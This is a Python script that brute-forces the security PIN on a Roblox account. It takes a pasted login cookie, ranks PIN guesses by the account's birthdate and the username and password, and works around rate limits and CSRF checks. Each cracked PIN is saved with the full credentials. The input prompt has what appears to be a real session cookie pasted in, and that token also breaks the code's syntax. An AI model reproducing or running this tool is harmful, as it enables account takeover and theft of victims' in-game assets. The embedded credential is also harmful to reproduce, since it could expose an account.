import time
import ctypes
import requests
from threading import Thread

account = input(
    'Enter your user:pass:cookie.\n'
    'No user:pass? Just do something like random:poop:<cookie>\n'
    '--> 'cookieOnly : isSupportedToo : _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_48EC1AFC8BB8C23F4D4E6BC324FB7CA264AB10ACB0D057245C5BEF64391B8C283D5FCEFF3723920456B794CABD36670B383D5376613E8EDEA39AC5A4D5175B8163B15A058D404E32A3761CD331970E1E4BB02BF776951268F853BB38B30A8310B52B28E3AF95F57C1F61FC362333E52C27BFA304EFE4C9293D0E739280B041C3F20D3F97182DC198C0A2388862F6A42C80021F74BBEE71703F0A2C567A1335A343B0E277BD66FA110FB2AF58DE453A5D01C5851B71A547F19318E1F00303AE3CE6B080E0AB5B05B9430D0EA05B01DE3692C065884D9E8CAC971B70E1411916B8736BA80F665D753A2258EED063BEA66D162F5E47D2601CFB7A59D30ABE68E0892F4EC89AEA74D928EB4DDF9D8376C5F7F17B18E3417D66F5601EA443F1D2A843092BF776DD2B21134A7AB11BD0D25BEFBF5F15005C444613A1CD56773E963CC0B0F74FC2

)

try: username, password, cookie = account.split(':',2)
except:
    input('INVALID FORMAT >:(')
    exit()

req = requests.Session()
req.cookies['.ROBLOSECURITY'] = cookie
try:
    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
    userid = r['UserID']
except:
    input('INVALID COOKIE')
    exit()

print('Logged in.\n')


r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
pins = [x.split(',')[0] for x in r.splitlines()]
print('Loaded most common pins.')

r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
month = str(r['birthMonth']).zfill(2)
day = str(r['birthDay']).zfill(2)
year = str(r['birthYear'])

likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
likely = [x for x in likely if x.isdigit() and len(x) == 4]
for pin in likely:
    pins.remove(pin)
    pins.insert(0, pin)

print(f'Prioritized likely pins {likely}\n')

sleep = 0
tried = 0

while 1:
    pin = pins.pop(0)
    ctypes.windll.kernel32.SetConsoleTitleW(f'PIN CRACKER | Tried: {tried}/9999 | Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('cracked.txt','a') as f:
                    f.write(f'NO PIN:{account}\n')
                break
            elif code == 3:
                pins.insert(0, pin)
                sleep += 1
                if sleep == 5:
                    sleep = 0
                    time.sleep(300)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('cracked.txt','a') as f:
                f.write(f'{pin}:{account}\n')
            break
        else:
            print(f'[ERROR] {r.text}')
            pins.append(pin)
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.append(pin)

input()
